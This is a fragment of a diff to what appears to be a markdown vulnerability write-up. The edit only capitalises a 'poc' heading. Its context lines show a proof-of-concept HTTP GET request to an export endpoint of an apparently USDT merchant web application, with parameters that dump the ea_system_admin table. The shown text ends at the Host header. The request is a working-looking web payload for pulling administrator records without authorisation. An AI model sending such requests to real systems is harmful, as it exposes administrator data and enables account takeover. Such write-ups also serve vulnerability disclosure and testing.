@@ -7,7 +7,7 @@
 "/usdtmerchant/login/reg.html"
 ```
 
-## poc
+## POC
 ```javascript
 GET /index/getway/excel?down=1&table=ea_system_admin&shunxu=desc&number=100 HTTP/1.1
 Host: 
